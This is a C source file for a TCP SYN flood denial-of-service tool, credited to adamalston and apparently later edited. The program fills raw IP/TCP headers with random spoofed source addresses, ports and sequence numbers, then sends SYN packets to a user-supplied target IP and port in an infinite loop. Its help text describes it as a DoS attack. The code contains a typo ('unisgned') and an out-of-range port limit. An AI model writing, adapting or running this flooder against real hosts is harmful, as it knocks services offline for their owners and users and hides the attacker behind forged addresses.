/* tcp_syn_flood.c
 * written by adamalston, edited by GiwbyAlbatross 2020 and 2026, respectively
 * usage: tcp_syn_flood TARGET_PORT TARGET_IP
 */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include "header.h"

#define PACKET_LEN 1500

unsigned short calculate_tcp_checksum(struct ipheader *ip);

// Given an IP packet, send it out using a raw socket.
void send_raw_ip_packet(struct ipheader *ip)
{
    struct sockaddr_in dest_info;
    int enable = 1;

    // Step 1: Create a raw network socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    // Step 2: Set socket option.
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

    // Step 3: Provide needed information about destination.
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;

    // Step 4: Send the packet out.
    sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
    close(sock);
}

// Spoof a TCP SYN packet.
int main(int argc, char ** argv)
{
    char buffer[PACKET_LEN];

    // "sanity check" of arguments + help message
    if (argc != 3) {
        printf("%s: conduct a SYN flood DoS attack (see https://github.com/adamalston/SYN-Flood/blob/master/README.md)\nARGUMENTS:\n\t%s TARGET_PORT TARGET_IP\n", argv[0], argv[0]);
        return 0;
    }
    
    char * dest_ip = argv[2];
    unisgned short int port;
    char * errstr;

    port = strtonum(argv[1], 1, 65536, &errstr);
    if (errstr != NULL) {
        printf("%s: error parsing port specification :'%s'", argv[0], errstr);
        return 2;
    }
    
    struct ipheader *ip = (struct ipheader *)buffer;
    struct tcpheader *tcp = (struct tcpheader *)(buffer + sizeof(struct ipheader));

    srand(time(0)); // Initialize the seed for random # generation.

    while (1)
    {
        memset(buffer, 0, PACKET_LEN);
        // Step 1: Fill in the TCP header.
        tcp->tcp_sport = rand(); 			// Use random source port
        tcp->tcp_dport = htons(port);
        tcp->tcp_seq = rand(); 				// Use random sequence #
        tcp->tcp_offx2 = 0x50;
        tcp->tcp_flags = TH_SYN; 			// Enable the SYN bit
        tcp->tcp_win = htons(20000);
        tcp->tcp_sum = 0;

        // Step 2: Fill in the IP header.
        ip->iph_ver = 4;					// Version (IPV4)
        ip->iph_ihl = 5;					// Header length
        ip->iph_ttl = 50;					// Time to live
        ip->iph_sourceip.s_addr = rand();	// Use a random IP address
        ip->iph_destip.s_addr = inet_addr(dest_ip);
        ip->iph_protocol = IPPROTO_TCP; 	// The value is 6.
        ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));

        // Calculate tcp checksum
        tcp->tcp_sum = calculate_tcp_checksum(ip);

        // Step 3: Finally, send the spoofed packet
        send_raw_ip_packet(ip);
    }

    return 0;
}
